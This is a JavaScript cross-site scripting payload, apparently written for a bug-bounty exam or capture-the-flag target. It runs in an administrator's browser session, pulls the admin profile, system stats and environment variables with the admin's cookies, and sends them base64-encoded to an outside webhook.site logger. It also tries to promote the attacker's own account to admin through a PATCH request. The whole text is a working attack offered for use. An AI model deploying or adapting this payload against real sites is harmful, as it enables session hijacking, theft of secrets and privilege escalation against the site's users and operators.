(async function() {
    const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
    const api = "https://api-bugbounty-exam.hashacademy.co/api";
    const myUserId = "69da4749adf0dbb976ce8e37"; 

    // 1. Secret Exfiltration: Grab the Admin's Profile & Platform Secret
    try {
        const profileRes = await fetch(`${api}/auth/profile`, { credentials: "include" });
        const profileData = await profileRes.json();
        new Image().src = `${logger}/?ADMIN_PROFILE=${btoa(JSON.stringify(profileData))}`;
    } catch (e) {}

    // 2. The "Second Vuln" Hunt: Dump System Stats & Verification Code
    try {
        const statsRes = await fetch(`${api}/admin/stats`, { credentials: "include" });
        const statsData = await statsRes.json();
        new Image().src = `${logger}/?SYSTEM_STATS=${btoa(JSON.stringify(statsData))}`;
    } catch (e) {}

    // 3. Vertical Escalation: Try to promote YOUR account to Admin
    try {
        await fetch(`${api}/users/${myUserId}`, {
            method: "PATCH",
            headers: { "Content-Type": "application/json" },
            credentials: "include",
            body: JSON.stringify({ 
                "role": "admin",
                "isAdmin": true 
            })
        });
    } catch (e) {}

    // 4. Environment Leak: Look for the hidden FLAG
    try {
        const envRes = await fetch(`${api}/admin/system/env`, { credentials: "include" });
        if (envRes.ok) {
            const envData = await envRes.json();
            new Image().src = `${logger}/?ENV_FLAG_LEAK=${btoa(JSON.stringify(envData))}`;
        }
    } catch (e) {}
})();
